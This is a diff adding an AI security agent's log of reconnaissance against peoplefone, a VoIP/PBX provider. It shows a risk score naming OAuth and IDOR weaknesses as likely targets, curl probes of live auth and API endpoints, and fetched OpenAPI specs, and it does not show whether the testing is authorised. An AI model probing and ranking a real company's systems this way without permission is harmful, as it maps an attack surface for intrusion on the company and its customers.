@@ -140,3 +140,1861 @@ STEP 6 — LEARNING
 
 STEP 7 — RISK
 [RISK] peoplefone: 72 — High-value VoIP/SIP/PBX platform with multi-tenant data (recordings, CDR, billing); auth + API surface unprobed; OAuth + IDOR classes historically yield critical findings in telco SaaS; wildcard DNS limits subdomain attack surface but core auth/API assets remain high-priority
+===== ANALYST nemotron3 2026-09-03 22:39:38 UTC =====
+[0m
+> build · nemotron-3-ultra-free
+[0m
+[0m$ [0mcurl -s -I "https://auth.peoplefone.com/.well-known/oauth-authorization-server" 2>&1 | head -20
+HTTP/1.1 404 Not Found
+Date: Thu, 03 Sep 2026 22:24:53 GMT
+Content-Type: text/html; charset=utf-8
+Connection: keep-alive
+Cache-Control: no-cache, private
+cf-cache-status: DYNAMIC
+expect-ct: max-age=86400, enforce
+referrer-policy: same-origin
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+Server: cloudflare
+CF-RAY: a3582acacf14840d-IAD
+[0m
+[0m$ [0mcurl -s -I "https://auth.peoplefone.com/.well-known/openid-configuration" 2>&1 | head -20
+HTTP/1.1 404 Not Found
+Date: Thu, 03 Sep 2026 22:25:06 GMT
+Content-Type: text/html; charset=utf-8
+Connection: keep-alive
+Cache-Control: no-cache, private
+cf-cache-status: DYNAMIC
+expect-ct: max-age=86400, enforce
+referrer-policy: same-origin
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+Server: cloudflare
+CF-RAY: a3582b21ca24840d-IAD
+[0m
+[0m$ [0mcurl -s -I "https://auth.peoplefone.com/" 2>&1 | head -30
+HTTP/1.1 404 Not Found
+Date: Thu, 03 Sep 2026 22:25:22 GMT
+Content-Type: text/html; charset=utf-8
+Connection: keep-alive
+Cache-Control: no-cache, private
+cf-cache-status: DYNAMIC
+expect-ct: max-age=86400, enforce
+referrer-policy: same-origin
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+Server: cloudflare
+CF-RAY: a3582b812b9e840d-IAD
+[0m
+[0m$ [0mcurl -s -I "https://api.peoplefone.com/" 2>&1 | head -30
+HTTP/1.1 302 Found
+Date: Thu, 03 Sep 2026 22:25:35 GMT
+Content-Type: text/html; charset=utf-8
+Connection: keep-alive
+Cache-Control: no-cache, private
+location: https://www.peoplefone.com/en-ch/developer
+Set-Cookie: peoplefone_api_gateway_session=eyJpdiI6IjRqY2VPSjFBMVE1ZUQ5K0hyaEdnbEE9PSIsInZhbHVlIjoiTWJlWWtrNUNsU3ZwcXJWRXNoMHV3ZE1pYmVVTmNDellXazcrdXQyU3QwRmVoZzlnV2V3aUhDSlBMeHFpYis5RnlRbU1yUnY5bFhHYU5VclY4ZjNUQ3AwT0E4bzFJcEJCZkowUGU1Z2RLOEJmY21hREkwMHRZZW05c0dTNmxiZ0UiLCJtYWMiOiI5NWM3MmNjY2RlOGM1ZmZjNjk0NGE3YzQ2ZjIyYWMzZjlkYzQwZDUxMTgyYjdmZjY3NDc2ZjQ5YjNkOGVmMGJjIiwidGFnIjoiIn0%3D; expires=Fri, 04 Sep 2026 00:25:35 GMT; Max-Age=7200; path=/; secure; httponly; samesite=lax
+x-envoy-upstream-service-time: 13
+Server: cloudflare
+cf-cache-status: DYNAMIC
+expect-ct: max-age=86400, enforce
+referrer-policy: same-origin
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+CF-RAY: a3582bd27f79d6fb-IAD
+[0m
+[0m$ [0mcurl -s "https://www.peoplefone.com/en-ch/developer" 2>&1 | head -100
+<!DOCTYPE html>
+<html lang="en-CH">
+<head>
+    <meta charset="utf-8">
+
+<!-- 
+	——————————————————————————————————————————————————
+		RTP GmbH | https://www.rtp.ch/
+		TYPO3 and Neos Application Development and Hosting
+		——————————————————————————————————————————————————
+
+	This website is powered by TYPO3 - inspiring people to share!
+	TYPO3 is a free open source Content Management Framework initially created by Kasper Skaarhoj and licensed under GNU/GPL.
+	TYPO3 is copyright 1998-2026 of Kasper Skaarhoj. Extensions are copyright of their respective owners.
+	Information and contribution at https://typo3.org/
+-->
+
+
+<title>Developer: Schweiz | Peoplefone AG</title>
+<meta property="og:type" content="website">
+<meta property="og:title" content="Developer">
+<meta property="og:url" content="https://www.peoplefone.com/en-ch/developer">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Developer">
+<meta name="generator" content="TYPO3 CMS">
+<meta name="robots" content="index,follow">
+<meta name="application-name" content="Peoplefone">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="apple-mobile-web-app-title" content="Peoplefone">
+<meta name="msapplication-tilecolor" content="#9b1c20">
+<meta name="msapplication-tileimage" content="/typo3conf/cd/favicons/mstile-144x144.png">
+<meta name="theme-color" content="#ffffff">
+<meta name="language" content="en-CH">
+<meta name="format-detection" content="telephone=no">
+<meta name="copyright" content="2026">
+
+
+<link rel="stylesheet" href="/typo3conf/cd/css/critical.min.css" media="all">
+<link rel="stylesheet" href="/_assets/d461d430ac6d491798edb1a70ad2c329/Css/Iconpack.min.css?1783505768" media="all">
+<link rel="stylesheet" href="/typo3conf/cd/css/custom.css?1771330461" media="all">
+<link rel="stylesheet" href="/js/vendors/swiper/swiper-bundle.min.css?1762248901" media="all">
+<link rel="stylesheet" href="/css/overrides.css?1782136929" media="all">
+<link rel="stylesheet" href="/_assets/9d1343e74b5f323053fb0f6af1895d1c/Css/TextIcon.css?1786022792" media="all">
+<link media="all" href="/_assets/d461d430ac6d491798edb1a70ad2c329/Css/IconpackTransforms.min.css?1783505768" rel="stylesheet" >
+
+
+<script src="/typo3conf/cd/js/critical.min.js?1730990459"></script>
+
+
+
+<link rel="icon" href="/typo3conf/cd/favicons/favicon.ico">
+<link rel="apple-touch-icon" sizes="180x180" href="/typo3conf/cd/favicons/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/typo3conf/cd/favicons/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/typo3conf/cd/favicons/favicon-16x16.png">
+<link rel="manifest" href="/typo3conf/cd/favicons/site.webmanifest">
+<link rel="mask-icon" href="/typo3conf/cd/favicons/safari-pinned-tab.svg" color="#9b1c20"><link rel="stylesheet" type="text/css" href="/typo3conf/cd/css/main.min.css" onload="this.setAttribute('media', 'all')" media="all"><link rel="prefetch" href="/typo3conf/cd/img/svg/svg.svg" /><link rel="prefetch" href="/typo3conf/cd/fonts/fira-sans-v15-latin-ext_latin-500.woff" />
+<link rel="prefetch" href="/typo3conf/cd/fonts/fira-sans-v15-latin-ext_latin-500.woff2" />
+<link rel="prefetch" href="/typo3conf/cd/fonts/fira-sans-v15-latin-ext_latin-600.woff" />
+<link rel="prefetch" href="/typo3conf/cd/fonts/fira-sans-v15-latin-ext_latin-600.woff2" />
+<link rel="prefetch" href="/typo3conf/cd/fonts/fira-sans-v15-latin-ext_latin-regular.woff" />
+<link rel="prefetch" href="/typo3conf/cd/fonts/fira-sans-v15-latin-ext_latin-regular.woff2" /><script data-cookieconsent="ignore">
+window.dataLayer = window.dataLayer || [];
+function gtag() {
+    dataLayer.push(arguments);
+}
+gtag("consent", "default", {
+    ad_storage: "denied",
+    analytics_storage: "denied",
+    functionality_storage: "denied",
+    personalization_storage: "denied",
+    security_storage: "granted",
+    wait_for_update: 2000,
+});
+gtag("set", "ads_data_redaction", true);
+gtag("set", "url_passthrough", false);
+</script><script data-cookieconsent="ignore">                            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-W8C3C93');</script><script id="Cookiebot" src="https://consent.cookiebot.com/uc.js" data-cbid="5208c2db-6bb7-46e7-968b-a09ebbd7e03d" data-blockingmode="auto" type="text/javascript"></script><script>
+salessuckers_cid=164; salessuckers_did=1190;
+var salessuckers_d='https://wunderpus.azurewebsites.net/client.js';
+(function(d,t) { var s=d.createElement(t); var r=d.getElementsByTagName(t)[0];
+    s.src=salessuckers_d;
+    s.setAttribute('async', '');
+    r.parentNode.insertBefore(s,r)
+}(document,'script'));
+</script>
+<noscript><img src="https://wunderpus.azurewebsites.net/api/v1/client/tr_px/161/986" style="width:0px;height:0px;" alt="" /></noscript><script id="CookieDeclaration" src=https://consent.cookiebot.com/5208c2db-6bb7-46e7-968b-a09ebbd7e03d/cd.js type="text/javascript" async></script>
+<link rel="canonical" href="https://www.peoplefone.com/en-ch/developer">
+
+<link rel="alternate" hreflang="de-CH" href="https://www.peoplefone.com/de-ch/developer">
+<link rel="alternate" hreflang="fr-CH" href="https://www.peoplefone.com/fr-ch/developer">
+<link rel="alternate" hreflang="it-CH" href="https://www.peoplefone.com/it-ch/developer">
+<link rel="alternate" hreflang="en-CH" href="https://www.peoplefone.com/en-ch/developer">
+<link rel="alternate" hreflang="x-default" href="https://www.peoplefone.com/de-ch/developer">
+<!-- This site is optimized with the Yoast SEO for TYPO3 plugin - https://yoast.com/typo3-extensions-seo/ -->
+<script type="application/ld+json">[{"@context":"https:\/\/www.schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/www.peoplefone.com\/en-ch\/","name":"Switzerland"}},{"@type":"ListItem","position":2,"item":{"@id":"https:\/\/www.peoplefone.com\/en-ch\/developer","name":"Developer"}}]}]</script>
+</head>
+<body class="pagetype--developer">
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-W8C3C93" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+
+    <header class="show-until-desktop-large page-header--container">
+        <div class="page-header--container-inner">
+[0m
+[0m$ [0mcurl -s "https://www.peoplefone.com/en-ch/developer" 2>&1 | grep -i -E "(api|graphql|swagger|openapi|endpoint|rest|documentation)" | head -30
+<noscript><img src="https://wunderpus.azurewebsites.net/api/v1/client/tr_px/161/986" style="width:0px;height:0px;" alt="" /></noscript><script id="CookieDeclaration" src=https://consent.cookiebot.com/5208c2db-6bb7-46e7-968b-a09ebbd7e03d/cd.js type="text/javascript" async></script>
+                        <a class="page-navigation--main-nav-link" href="/en-ch/developer/documentation">
+                            Documentation
+        <a href="/en-ch/developer/kontaktformular-api" class="cta">
+                    <picture><source srcset="/fileadmin/_processed_/8/c/csm_API_Integration_mit_Titel_41a3359733.jpg 1x, /fileadmin/_processed_/8/c/csm_API_Integration_mit_Titel_043c59104d.jpg 2x" media="(max-width:767px)" /><source srcset="/fileadmin/_processed_/8/c/csm_API_Integration_mit_Titel_41a3359733.jpg 1x, /fileadmin/_processed_/8/c/csm_API_Integration_mit_Titel_043c59104d.jpg 2x" media="(min-width:768px)" /><img src="/fileadmin/_processed_/8/c/csm_API_Integration_mit_Titel_7eef02b577.jpg" alt="" title="" loading="lazy" /></picture>
+                    <picture><source srcset="/fileadmin/_processed_/4/c/csm_API_for_developement_8f7f4b5a4e.jpg 1x, /fileadmin/_processed_/4/c/csm_API_for_developement_ac9257f8ea.jpg 2x" media="(max-width:600px)" /><source srcset="/fileadmin/_processed_/4/c/csm_API_for_developement_47a9ca3ba8.jpg 1x, /fileadmin/_processed_/4/c/csm_API_for_developement_d67bf06371.jpg 2x" media="(min-width:601px) and (max-width:1024px)" /><source srcset="/fileadmin/_processed_/4/c/csm_API_for_developement_2c1741fb54.jpg 1x, /fileadmin/_processed_/4/c/csm_API_for_developement_28e0978d17.jpg 2x" media="(min-width:1025px)" /><img src="/fileadmin/_processed_/4/c/csm_API_for_developement_5e05e29e91.jpg" alt="" title="" id="box-image-2997" loading="lazy" /></picture>
+                    <h4>Direct Integration with our API</h4>
+                        Our API is available to all developers for their own integration ideas.<br />
+The API is currently available for sending SMS services and will be further developed for other services in 2025.<br />
+The API is free to use. peoplefone provides comprehensive documentation.
+                <a href="https://api.peoplefone.com/services/api-doc/" target="_blank" rel="noreferrer" class="cta">
+                    Link to the API documentation
+                        The peoplefone communication services are compatible with the automation platforms make.com and Zapier.<br />
+                <a href="https://support.peoplefone.com/en-che/api/api-external-tools-automation-platforms/" target="_blank" rel="noreferrer" class="cta">
+                        <h3>Expert Talk on the peoplefone API</h3>
+            <p>Follow the peoplefone Expert Talk on API now.</p><ul><li>How can you use the peoplefone API?</li><li>How can you use the integration with the automation platforms Make.com and Zapier without any programming effort?</li><li>What services does the peoplefone API offer?</li><li>Practical application examples</li></ul><p>The Expert Talk is in German. For the French version switch the language to French.</p>
+                <iframe src="https://www.youtube-nocookie.com/embed/S6qECYl7Jnk?autohide=1&amp;controls=1&amp;enablejsapi=1&amp;origin=https%3A%2F%2Fwww.peoplefone.com" allowfullscreen width="1208" allow="fullscreen"></iframe>
+                    <h2 class="center">Our showcases for the peoplefone SMS-API</h2>
+for the peoplefone SMS API. The API is available to all developers. <br />
+            <p>A simple example of a practical application of the SMS API for a reservation system.</p>
+            <p>We will be continuously expanding our API solutions.</p>
+<p>Until we have finalised our documentation, you can contact our development team directly.</p>
+            <a href="/en-ch/developer/kontaktformular-api" class="cta">Contact our development team</a>
+        var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+[0m
+[0m$ [0mcurl -s -I "https://api.peoplefone.com/services/api-doc/" 2>&1 | head -30
+HTTP/1.1 200 OK
+Date: Thu, 03 Sep 2026 22:26:34 GMT
+Content-Type: text/html
+Connection: keep-alive
+x-content-type-options: nosniff
+last-modified: Thu, 03 Sep 2026 14:40:55 GMT
+vary: Accept-Encoding
+expect-ct: max-age=86400, enforce
+x-xss-protection: 1; mode=block
+expires: Fri, 04 Sep 2026 22:26:34 GMT
+Cache-Control: max-age=86400
+access-control-allow-origin: *
+access-control-allow-methods: GET, POST, OPTIONS
+access-control-allow-headers: DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type
+x-frame-options: SAMEORIGIN
+content-security-policy: frame-ancestors 'none'
+referrer-policy: same-origin
+x-envoy-upstream-service-time: 1
+Server: cloudflare
+cf-cache-status: DYNAMIC
+CF-RAY: a3582d434886c9bb-IAD
+[0m
+[0m$ [0mcurl -s "https://api.peoplefone.com/services/api-doc/" 2>&1 | head -200
+<!-- HTML for static distribution bundle build -->
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>Swagger UI</title>
+    <link rel="stylesheet" type="text/css" href="./swagger-ui.css" />
+    <link rel="stylesheet" type="text/css" href="index.css" />
+    <link rel="icon" type="image/png" href="./favicon-32x32.png" sizes="32x32" />
+    <link rel="icon" type="image/png" href="./favicon-16x16.png" sizes="16x16" />
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11.10.1/dist/mermaid.min.js"></script>    <script src="mermaid.js"></script>
+  </head>
+
+  <body>
+    <div id="swagger-ui"></div>
+    <script src="./swagger-ui-bundle.js" charset="UTF-8"> </script>
+    <script src="./swagger-ui-standalone-preset.js" charset="UTF-8"> </script>
+    <script src="./swagger-initializer.js" charset="UTF-8"> </script>
+  <script>window.__CF$cv$params={r:'a3582d929fe42d20',t:'MTc4ODQ3NDQwNg==',u:'01a06961b95877d08bbcc39ced6f739e',ut:'rNRE_.zikUaT8zcK0NgzojXPxKO4H2KTndwf4ADKRVU-1788474407-1.2.1.1-mdKI5eNAKo7GM7mV6w2U2zlk8GaCICh7Yd8i.oBfeonyn73MaiKiQ5S3ixUYGiLEgsqzW61lcExoykpA2tCBahThlR6VFdF08E6kXahhUn0',i:60};(function(){if(!document.body)return;var s=document.createElement('script');s.src='/cdn-cgi/challenge-platform/scripts/precursor/main.js';document.head.appendChild(s);})();</script></body>
+</html>
+[0m
+[0m$ [0mcurl -s "https://api.peoplefone.com/services/api-doc/swagger-initializer.js" 2>&1 | head -100
+window.onload = function() {
+  
+      //<editor-fold desc="Changeable Configuration Block">
+      window.ui = SwaggerUIBundle({
+        url: "https://petstore.swagger.io/v2/swagger.json",
+        "dom_id": "#swagger-ui",
+        deepLinking: true,
+        presets: [
+          SwaggerUIBundle.presets.apis,
+          SwaggerUIStandalonePreset
+        ],
+        plugins: [
+          SwaggerUIBundle.plugins.DownloadUrl
+        ],
+        layout: "StandaloneLayout",
+        queryConfigEnabled: false,
+        urls: [ { url:'/services/api-doc/api/CallManagementV1.yml', name:'call | Call Management | v1' }, { url:'/services/api-doc/api/ConfigAPI_ExternalNumberLookup.yml', name:'External Number Lookup Service | v1' }, { url:'/services/api-doc/api/ConfigApiV1.yml', name:'Configuration API | v1' }, { url:'/services/api-doc/api/ExternalRoutingV1.yml', name:'External Routing | v1' }, { url:'/services/api-doc/api/QueueApiV1.yml', name:'Queue API | Stats v1' }, { url:'/services/api-doc/api/SmartRoutingV1.yml', name:'Smart Routing | v1' }, { url:'/services/api-doc/api/SMSGW.yml', name:'SMS GW API' }, { url:'/services/api-doc/api/UaCsta_v1.yml', name:'Remote Call Control uaCSTA' } ],
+      })
+      
+      //</editor-fold>
+
+};
+[0m
+[0m$ [0mcurl -s "https://api.peoplefone.com/services/api-doc/api/ConfigApiV1.yml" 2>&1 | head -150
+openapi: 3.1.1
+info:
+  title: "Configuration API | v1"
+  description: |
+    ## Overview
+    Provides access to view and configure Peoplefone VoIP / PBX elements:
+    Smart Routing, Groups, IVR/Announcement, Lines, Manual Routing, Numbers,
+    Queues, Time Routing, and Users.
+
+    ## Documentation
+    Configuration API for customer PBX management.
+
+    ## API Status: Beta
+    This API is still in development. Backward compatibility is not guaranteed
+    while the contract remains in beta; breaking changes may still occur.
+
+    ## Common Errors
+    These errors may be returned for any endpoint.
+    They are not repeated per operation.
+
+    | Status | Description | Template reference |
+    | --- | --- | --- |
+    | 400 | Malformed or invalid request | BadRequestError |
+    | 401 | Missing or invalid authentication | UnauthorizedError |
+    | 403 | Action not allowed | ForbiddenError |
+    | 404 | Resource or route not found | ResourceNotFoundError |
+    | 429 | Rate limit or quota exceeded | TooManyRequestsError |
+    | 500 | Unexpected server failure | InternalServerError |
+    | 503 | Dependency unavailable | ServiceUnavailableError |
+
+    See the [Error response catalogue](#/99.%20Error%20catalogue) for response schemas and examples (common and operation-specific errors).
+    Operation-specific errors (405, 409, 415, 418, 419, 422) are also documented
+    per operation when applicable.
+
+    ## Changelog
+    ### v1.0.0 - 2026-07-17 - beta
+    * Initial beta release of the Configuration API contract.
+    * Covers Destinations, Smart Routing, Groups, IVR/Announcement, Queues,
+      Numbers, Manual Routing, Time Routing, and Users.
+
+  version: "1.0.0 beta"
+
+servers:
+  - url: https://configuration-api.peoplefone.com/customer/voip/v1
+    description: Production
+
+security:
+  - bearerAuth: []
+
+tags:
+  - name: "1. Destinations"
+    description: "Available routing destinations."
+  - name: "2. CallForwarding"
+    description: "Call Forwarding configuration, including forwarding rules and exceptions."
+  - name: "3. Smart Routing"
+    description: "Smart Routing configuration."
+  - name: "4. Groups"
+    description: "Group configuration and members."
+  - name: "5. IVR/Announcement"
+    description: "IVR menus and announcements."
+  - name: "6. Queues"
+    description: "Queue configuration and agents."
+  - name: "7. Numbers"
+    description: "Number blocks, DIDs, and contacts."
+  - name: "8. Manual Routing"
+    description: "Manual routing rules."
+  - name: "9. Time Routing"
+    description: "Time-based routing, exceptions, and schedules."
+  - name: "10. Users"
+    description: "User configuration."
+  - name: "99. Error catalogue"
+    description: "Documentation-only error response catalogue."
+
+paths:
+  /destinations:
+    get:
+      tags:
+        - "1. Destinations"
+      summary: List all destinations
+      operationId: listDestinations
+      description: >
+        Returns the available destinations.  
+        Two JSON layouts are being evaluated (grouped vs flat); both are shown below.
+      parameters:
+        - $ref: 'template/v202607-base-template.yml#/components/parameters/PageNumber'
+        - $ref: 'template/v202607-base-template.yml#/components/parameters/PageSize'
+        - name: types
+          in: query
+          description: >
+            Optional list of destination types to return.
+
+            Accepts comma-separated values (`?types=queue,ivr`) or
+            repeated keys (`?types[]=queue&types[]=ivr`).
+            
+
+            Available: group, timeRouting, queue, voicemail, ivr, manualRouting, user, smartRouting
+          required: false
+          schema:
+            type: string
+            example: queue,ivr
+
+      responses:
+        "200":
+          description: OK – flat list
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/DestinationListResponse'
+              examples:
+                default:
+                  summary: "Destination list"
+                  value:
+                    data:
+                      - identifier: "20011"
+                        name: "Standard user 11"
+                        type: "user"
+                        internalNumber: null
+                      - identifier: "1612"
+                        name: "Test queue 12"
+                        type: "queue"
+                        internalNumber: "212"
+                    pageNumber: 1
+                    pageSize: 2
+                    totalElements: 2
+                    totalPages: 1
+                    last: true
+
+  /virtualUsers/{identifier}/callforwarding:
+    get:
+      tags:
+        - "2. CallForwarding"
+      summary: Get call forwarding by Virtual User ID
+      description: >
+        Retrieves the call forwarding configuration for a specific user.
+      parameters:
+        - $ref: 'template/v202607-base-template.yml#/components/parameters/PageNumber'
+        - $ref: 'template/v202607-base-template.yml#/components/parameters/PageSize'
+        - name: identifier
+          in: path
+          required: true
+          schema:
+            type: string
+            description: Virtual User ID
+            example: 12345
+      responses:
+        "200":
+          description: Call forwarding details
+          content:
+            application/json:
+              schema:
+[0m
+[0m$ [0mcurl -s "https://api.peoplefone.com/services/api-doc/api/CallManagementV1.yml" 2>&1 | head -200
+openapi: 3.1.1
+info:
+    title: call | Call Management | v1
+    description: |
+        Call Management API to act on existing peoplefone HOSTED calls
+        
+        ## Proposed function are of two kinds:
+        - a way to acquire current call for a given user
+        - action to interact with a given call
+        
+        ## Change log of v1:
+        __v1.0.0__
+        - way to get list of active call
+        - action to blind transfer, hold and unhold a given call
+        
+        __v1.1.0__
+        - subscription to be notified of call state changes (beta version)
+        - add details in the call info (state, direction, remote party)
+        
+        __v1.1.1__
+        - move from openapi 3.0.0 to 3.1.1
+
+        __v1.1.2__
+        - rename the contract title to fit guidelines
+        - grouping endpoint by context
+
+        __v1.2.0__
+        - apply review changes, subscription final version
+        
+        __v1.2.1__
+        - fix typo in the contract
+
+        _note: changes to major version will apply only if a change break backward compatibility of a published API_
+    version: 1.2.1
+servers:
+    - url: https://call-api.peoplefone.com/customer/call-management/v1
+paths:
+    /call:
+        post:
+            tags:
+                - Acquire calls
+            summary: Get active call for the given user
+            description: |
+                This function allows to acquire the list of active calls for the given user.
+                
+                This is not the best way to acquire calls as it is in polling mode only, however it can
+                be useful to have this method available for integration purpose.
+                
+                It is recommended to use the subscription way to acquire calls instead.
+                
+                _note: the owner 'entity' must be of type 'user', 
+                and this user must be part of the account bound to the bearer token_
+            requestBody:
+                content:
+                    application/json:
+                        schema:
+                            $ref: '#/components/schemas/ListCallRequestBody'
+                        examples:
+                            default:
+                                summary: list call
+                                value:
+                                    owner:
+                                        identifier: "1234"
+                                        type: user
+            responses:
+                '200':
+                    description: Success
+                    content:
+                        application/json:
+                            schema:
+                                $ref: '#/components/schemas/ListCallResponse'
+                            examples:
+                                oneCall:
+                                    summary: One Call confirmed
+                                    value:
+                                        data:
+                                            - callId: "abcd"
+                                              state: "confirmed" 
+                                              direction: "incoming"
+                                              remoteParty:
+                                                type: "number"
+                                                identifier: "+41215522000"
+                                        pageNumber: 1
+                                        pageSize: 1
+                                        totalElements: 1
+                                        totalPages: 1
+                                        last: true
+                                twoCall:
+                                    summary: Two Calls
+                                    value:
+                                        data:
+                                            - callId: "1"
+                                              state: "terminated" 
+                                              direction: "incoming"
+                                              remoteParty:
+                                                type: "number"
+                                                identifier: "+41215522000"
+                                            - callId: "2"
+                                              state: "confirmed"
+                                              direction: "outgoing"
+                                              remoteParty:
+                                                  type: "number"
+                                                  identifier: "+41445522000"
+                                        pageNumber: 1
+                                        pageSize: 2
+                                        totalElements: 2
+                                        totalPages: 1
+                                        last: true
+                '400':
+                    $ref: 'template/v202504-template.yml#/components/responses/BadRequestError'
+                '401':
+                    $ref: 'template/v202504-template.yml#/components/responses/UnauthorizedError'
+                '403':
+                    $ref: 'template/v202504-template.yml#/components/responses/ForbiddenError'
+                '404':
+                    $ref: 'template/v202504-template.yml#/components/responses/NotFoundError'
+                '405':
+                    $ref: 'template/v202504-template.yml#/components/responses/NotAllowedError'
+                '418':
+                    $ref: 'template/v202504-template.yml#/components/responses/UnexpectedEntityError'
+                '429':
+                    $ref: 'template/v202504-template.yml#/components/responses/TooManyRequestsError'
+                '500':
+                    $ref: 'template/v202504-template.yml#/components/responses/ServerInternalError'
+                '503':
+                    $ref: 'template/v202504-template.yml#/components/responses/ServiceUnavailableError'
+            security:
+                - bearerAuth: []
+    /call/blind-transfer:
+        post:
+            tags:
+                - Act on a specific call
+            summary: blind transfer the given call to the given destination
+            description: |
+                This function allows to blind transfer the given call of the given user to the desired destination.
+                
+                If the given call is not owned by the given user this action will be forbidden.
+                
+                _note: the owner 'entity' must be of type 'user', 
+                and this user must be part of the account bound to the bearer token_
+                
+                In addition the destination is so far limited to the type 'number'.
+            requestBody:
+                content:
+                    application/json:
+                        schema:
+                            $ref: '#/components/schemas/BlindTransferRequestBody'
+                        examples:
+                            default:
+                                summary: Blind transfer
+                                value:
+                                    owner:
+                                        identifier: "1234"
+                                        type: "user"
+                                    callId: "abcd"
+                                    destination:
+                                        identifier: "0215522000"
+                                        type: "number"
+            responses:
+                '202':
+                    description: Accepted
+                '400':
+                    $ref: 'template/v202504-template.yml#/components/responses/BadRequestError'
+                '401':
+                    $ref: 'template/v202504-template.yml#/components/responses/UnauthorizedError'
+                '403':
+                    $ref: 'template/v202504-template.yml#/components/responses/ForbiddenError'
+                '404':
+                    $ref: 'template/v202504-template.yml#/components/responses/NotFoundError'
+                '405':
+                    $ref: 'template/v202504-template.yml#/components/responses/NotAllowedError'
+                '418':
+                    $ref: 'template/v202504-template.yml#/components/responses/UnexpectedEntityError'
+                '429':
+                    $ref: 'template/v202504-template.yml#/components/responses/TooManyRequestsError'
+                '500':
+                    $ref: 'template/v202504-template.yml#/components/responses/ServerInternalError'
+                '503':
+                    $ref: 'template/v202504-template.yml#/components/responses/ServiceUnavailableError'
+            security:
+                - bearerAuth: []
+    /call/hold:
+        post:
+            tags:
+                - Act on a specific call
+            summary: hold the given call
+            description: |
+                This function allows to hold the given call of the given user (start playing the music on hold).
+                
+                If the given call is not owned by the given user this action will be forbidden.
+                
+                _note: the owner 'entity' must be of type 'user', 
+                and this user must be part of the account bound to the bearer token_
+                
+                If the call is already on hold, this action has no effect.
+            requestBody:
+                content:
+                    application/json:
+                        schema:
+                            $ref: '#/components/schemas/HoldRequestBody'
+[0m
+[0m$ [0mcurl -s "https://api.peoplefone.com/services/api-doc/api/SMSGW.yml" 2>&1 | head -150
+openapi: 3.0.0
+info:
+  title: SMS GW API
+  description: |
+      Communication between the Peoplefone SMS Gateway, SMS client app / webhook endpoint and SMS provider to handles SMS messaging
+      
+      Sending SMS message sequence:<pre>
+      SMS client app --  [sms_message, callback_url] --> API GW -> + token -> SMS GW --  [sms_message]    --> SMS Provider
+      SMS client app <-- [sms_message_resp]              SMS GW <-- [submit_sms_resp] -- SMS Provider</pre>
+      
+      Sending SMS delivery report sequence:<pre>
+      SMS Provider --  [delivery_report] --> SMS GW --  [smsStatusUpdateEvent]    --> callback_url</pre>
+
+  version: 1.0.0
+servers:
+  - url: https://api.peoplefone.com/customer/sms
+paths:
+  /v1/sms/messages/status/{messageId}:
+    get:
+      summary: Get sms message status
+      parameters:
+      - name: messageId
+        in: path
+        description: the sms message identifier
+        required: true
+        schema:
+          type: string
+      responses:
+        '200':
+          description: Success
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/SendMessageStatusResponse'
+        '401':
+            $ref: '#/components/responses/UnauthorizedError'
+        '404':
+            $ref: '#/components/responses/NotFoundError'
+      security:
+      - bearerAuth: []
+  /v1/sms/messages/{messageId}:
+    get:
+      summary: Get sms message details
+      parameters:
+      - name: messageId
+        in: path
+        description: the sms message identifier
+        required: true
+        schema:
+          type: string
+      responses:
+        '200':
+          description: Success
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/SendMessageDetailsResponse'
+        '401':
+            $ref: '#/components/responses/UnauthorizedError'
+        '404':
+            $ref: '#/components/responses/NotFoundError'
+      security:
+      - bearerAuth: []
+    delete:
+      summary: Cancel scheduled SMS message
+      operationId: v1SmsMessagesMessageIdCancel
+      parameters:
+        - name: messageId
+          in: path
+          description: the sms message identifier
+          required: true
+          schema:
+            type: string
+      responses:
+        '200':
+          description: Success
+        '401':
+          description: Access token is missing or invalid
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/BaseResponse'
+        '404':
+          description: Resource not found
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/BaseResponse'
+        '409':
+          description: Message is either not scheduled or is currently being sent/delivered
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/BaseResponse'
+      security:
+        - bearerAuth: []
+  /v1/sms/messages:
+    get:
+      summary: List SMS messages
+      operationId: v1SmsMessagesList
+      parameters:
+      - name: status
+        in: query
+        description: The statuses of the SMS messages to seek
+        required: false
+        schema:
+          uniqueItems: true
+          type: array
+          items:
+            $ref: '#/components/schemas/SmsStatus'
+      - name: page
+        in: query
+        description: The page number. Zero-based page index (0..N)
+        required: false
+        schema:
+          minimum: 0
+          type: integer
+          format: int32
+          default: 0
+      - name: size
+        in: query
+        description: The number of items per page to be returned
+        required: false
+        schema:
+          minimum: 0
+          type: integer
+          format: int32
+          default: 10
+      - name: sort
+        in: query
+        description: The sort order (ASC for ascending or DESC for descending) for
+          the results. Sorting is done base on time of receiving the SMS message by
+          API/system.
+        required: false
+        schema:
+          type: string
+          default: DESC
+          enum:
+          - ASC
+          - DESC
+      - name: maxAge
+        in: query
